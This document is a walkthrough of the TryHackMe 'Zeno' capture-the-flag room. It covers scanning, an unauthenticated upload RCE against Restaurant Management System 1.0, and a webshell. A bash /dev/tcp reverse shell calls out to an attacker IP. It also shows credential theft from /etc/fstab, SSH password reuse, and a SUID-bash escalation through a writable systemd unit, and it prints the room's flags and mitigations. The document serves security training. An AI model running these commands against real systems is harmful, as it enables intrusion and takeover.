# Zeno CTF Walkthrough

**Target:** Zeno  
**Source:** [TryHackMe](https://tryhackme.com/room/zeno)  
**Difficulty:** Medium  
**Target IP:** 10.112.129.169

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [RMS Remote Code Execution (CVE-2015-...)](#rms-remote-code-execution)
- [Reverse Shell](#reverse-shell)
- [Credential Discovery](#credential-discovery)
- [SSH Foothold](#ssh-foothold)
- [User Flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)

---

## Overview

Zeno is a medium Linux box built around a vulnerable **Restaurant Management
System (RMS)** web application running on a non-standard port. The objective is
to gain a foothold and escalate to root, capturing both the user and root flags.
The attack chain covers service enumeration to discover the RMS app, an
unauthenticated **file upload / remote code execution** exploit to drop a
webshell, a reverse shell as the `apache` user, credential discovery from an
`/etc/fstab` CIFS mount entry, lateral movement via SSH as `edward`, and a
**writable systemd service** combined with `sudo reboot` to set the SUID bit on
`/bin/bash` for root.

**Key Skills Required:**
- Network scanning and service enumeration
- Web directory brute-forcing
- Public exploit research with `searchsploit`
- File upload / RCE exploitation and reverse shells
- Credential discovery from configuration files
- Lateral movement via SSH
- Linux privilege escalation via writable systemd service + `sudo reboot`

---

## Reconnaissance

### Network Scanning

```bash
nmap 10.112.129.169
```

An initial scan shows only SSH. A full port scan with service detection reveals
the web application on a high, non-standard port:

```bash
nmap -sV -sS -Pn -A -p- 10.112.129.169
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH 7.4 (protocol 2.0) |
| 12340/tcp | http | Apache httpd 2.4.6 (CentOS) PHP/5.4.16 |

```
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
12340/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: We've got some trouble | 404 - Resource not found
```

The web service on **port 12340** is the only real attack surface, since SSH
gives nothing without credentials.

---

## Web Enumeration

### Directory Brute Force

```bash
gobuster dir -u http://10.112.129.169:12340/ -w /usr/share/wordlists/dirb/big.txt
```

```
.htpasswd   (Status: 403)
.htaccess   (Status: 403)
rms         (Status: 301) [--> http://10.112.129.169:12340/rms/]
```

The `/rms/` directory hosts a **Restaurant Management System** application.

> **Application:** Restaurant Management System (RMS) 1.0 at `/rms/`

---

## RMS Remote Code Execution

A `searchsploit` lookup on the application reveals a public RCE exploit:

```bash
searchsploit restaurant management system
```

```
Restaurant Management System 1.0 - SQL Injection           | php/webapps/51330.txt
Restaurant Management System 1.0 - Remote Code Execution    | php/webapps/47520.py
```

> **CVE / Exploit:** Restaurant Management System 1.0 — unauthenticated file
> upload leading to Remote Code Execution (Exploit-DB 47520).

The exploit is copied locally and run against the target. (An earlier attempt was
kept as `old_exploit.py`; the working copy is `exploit.py`.)

```bash
locate 47520.py
cp /usr/share/exploitdb/exploits/php/webapps/47520.py exploit.py
python3 exploit.py http://10.112.129.169:12340/rms/
```

```
[+] Restaurant Management System Exploit, Uploading Shell
[+] Shell Uploaded. Please check the URL : http://10.112.129.169:12340/rms/images/reverse-shell.php
[+] Status code: 200
```

The uploaded webshell executes commands via a `cmd` parameter:

```bash
curl "http://10.112.129.169:12340/rms/images/reverse-shell.php?cmd=id"
```

```
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

> **Code execution confirmed** as the `apache` user.

---

## Reverse Shell

A PHP reverse shell (`shell.php`) provides an interactive session. The webshell's
`cmd` parameter is used to trigger a bash reverse connection back to a netcat
listener:

```bash
# Attacker: start the listener
rlwrap nc -nvlp 9090

# Trigger reverse shell through the webshell
curl -G 'http://10.112.129.169:12340/rms/images/reverse-shell.php' \
  --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/192.168.132.9/9090 0>&1"'
```

```
connect to [192.168.132.9] from (UNKNOWN) [10.112.129.169] 35122
bash-4.2$ whoami
apache
bash-4.2$ export TERM=xterm
```

> **Foothold:** `apache`

---

## Credential Discovery

The RMS database config exposes a MySQL root password, though it doesn't directly
authenticate to the database:

```bash
bash-4.2$ cat /var/www/html/rms/connection/config.php
```

```php
define('DB_USER', 'root');
define('DB_PASSWORD', 'veerUffIrangUfcubyig');
define('DB_DATABASE', 'dbrms');
```

The real find is a commented-out CIFS share entry in `/etc/fstab` containing
plaintext credentials:

```bash
bash-4.2$ cat /etc/fstab
```

```
#//10.10.10.10/secret-share  /mnt/secret-share  cifs  _netdev,vers=3.0,ro,username=zeno,password=FrobjoodAdkoonceanJa,domain=localdomain,soft  0 0
```

> **Recovered credentials:** `zeno : FrobjoodAdkoonceanJa`

---

## SSH Foothold

The `zeno` username fails over SSH, so the home directory is checked for the real
local account:

```bash
bash-4.2$ ls /home
edward
```

Reusing the discovered password with `edward` succeeds:

```bash
ssh edward@10.112.129.169
# password: FrobjoodAdkoonceanJa
[edward@zeno ~]$ whoami
edward
```

> **Foothold:** `edward` (password reuse — `edward : FrobjoodAdkoonceanJa`)

---

## User Flag

```bash
[edward@zeno ~]$ cat user.txt
THM{070cab2c9dc622e5d25c0709f6cb0510}
```

> **User flag:** `THM{070cab2c9dc622e5d25c0709f6cb0510}`

---

## Privilege Escalation

Checking sudo rights shows `edward` can run `reboot` as root without a password:

```bash
[edward@zeno ~]$ sudo -l
User edward may run the following commands on zeno:
    (ALL) NOPASSWD: /usr/sbin/reboot
```

A root-owned systemd service is writable by `edward`:

```bash
[edward@zeno ~]$ cat /etc/systemd/system/zeno-monitoring.service
[Service]
Type=simple
User=root
ExecStart=/root/zeno-monitoring.py
```

Because the service runs as **root** and the file is **writable**, the
`ExecStart` line is replaced to set the SUID bit on `/bin/bash`. Triggering the
passwordless `reboot` re-runs the service at boot and applies the change:

```bash
[edward@zeno ~]$ vim /etc/systemd/system/zeno-monitoring.service
```

```ini
[Service]
Type=simple
User=root
ExecStart=/usr/bin/chmod +s /bin/bash
```

```bash
[edward@zeno ~]$ sudo /usr/sbin/reboot
```

After the reboot, `/bin/bash` is SUID-root. Dropping a privileged shell with
`-p` (which preserves the effective UID) yields root:

```bash
-bash-4.2$ /bin/bash -p
bash-4.2# whoami
root
bash-4.2# id
uid=1000(edward) euid=0(root) egid=0(root) groups=0(root),1000(edward)
```

The root flag is then read directly:

```bash
bash-4.2# cat /root/root.txt
THM{b187ce4b85232599ca72708ebde71791}
```

> **Root flag:** `THM{b187ce4b85232599ca72708ebde71791}`

---

## Flags

| Flag | Value | Location |
|------|-------|----------|
| User flag | `THM{070cab2c9dc622e5d25c0709f6cb0510}` | `/home/edward/user.txt` |
| Root flag | `THM{b187ce4b85232599ca72708ebde71791}` | `/root/root.txt` |

---

## Vulnerabilities

### 1. Restaurant Management System — Unauthenticated RCE (Critical)

**Description:** The RMS 1.0 application at `/rms/` allowed unauthenticated file
upload, enabling an attacker to drop a PHP webshell (Exploit-DB 47520) and execute
arbitrary commands as the `apache` user.

**Impact:** Remote code execution and an initial foothold on the host.

**Mitigation:**
- Patch or replace the vulnerable RMS application.
- Enforce authentication and strict server-side validation on file uploads
  (type, extension, content), and store uploads outside the web root with
  execution disabled.

### 2. Plaintext Credentials in Configuration Files (High)

**Description:** A database password sat in `connection/config.php`, and SSH-usable
credentials (`zeno:FrobjoodAdkoonceanJa`) were left in a commented `/etc/fstab`
CIFS mount entry.

**Impact:** Credential reuse enabled lateral movement to the `edward` user.

**Mitigation:**
- Never store plaintext credentials in config or fstab; use a secrets manager.
- Enforce unique passwords across accounts and services to prevent reuse.

### 3. Password Reuse Across Accounts (High)

**Description:** The password tied to the `zeno` share also worked for the local
`edward` account.

**Impact:** Direct SSH access as a valid local user.

**Mitigation:**
- Use distinct, high-entropy credentials per account.
- Enforce key-based SSH authentication.

### 4. Writable Root Systemd Service + Passwordless `reboot` (Critical)

**Description:** `edward` had write access to a root-owned systemd unit
(`zeno-monitoring.service`) and `NOPASSWD` rights to `/usr/sbin/reboot`. Editing
the service's `ExecStart` to `chmod +s /bin/bash` and rebooting made bash
SUID-root.

**Impact:** Full privilege escalation from `edward` to `root` via `/bin/bash -p`.

**Mitigation:**
- Restrict write permissions on systemd unit files to root only.
- Avoid granting `sudo` on actions (like `reboot`) that re-execute attacker-
  controlled service definitions.
- Apply least privilege in `sudoers`.

---

## Attack Chain Summary

```
Nmap scan → SSH (22) + Apache RMS (12340)
    ↓
Gobuster → /rms/ (Restaurant Management System 1.0)
    ↓
searchsploit → 47520.py (unauthenticated RCE)
    ↓
exploit.py → upload webshell → RCE as apache
    ↓
shell.php reverse shell → interactive apache shell
    ↓
cat /etc/fstab → zeno : FrobjoodAdkoonceanJa
    ↓
Password reuse → SSH as edward
    ↓
User flag: THM{070cab2c9dc622e5d25c0709f6cb0510}
    ↓
sudo -l → NOPASSWD reboot ; writable zeno-monitoring.service
    ↓
Edit ExecStart=chmod +s /bin/bash → sudo reboot
    ↓
/bin/bash -p → root shell
    ↓
Root flag: THM{b187ce4b85232599ca72708ebde71791}
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/version detection |
| Gobuster | Web directory enumeration |
| searchsploit / exploit.py (47520) | RMS file upload / RCE exploit |
| curl | Webshell command execution and reverse shell trigger |
| php-reverse-shell (shell.php) | Interactive reverse shell payload |
| netcat / rlwrap | Reverse shell listener |
| ssh | Lateral movement and remote access |
| vim | Editing the writable systemd service |

---

## References

- [TryHackMe — Zeno](https://tryhackme.com/room/zeno)
- [Nmap](https://nmap.org/)
- [Gobuster](https://github.com/OJ/gobuster)
- [Exploit-DB 47520 — RMS RCE](https://www.exploit-db.com/exploits/47520)
- [GTFOBins — bash (SUID)](https://gtfobins.github.io/gtfobins/bash/)
- [systemd Privilege Escalation](https://book.hacktricks.xyz/)

---
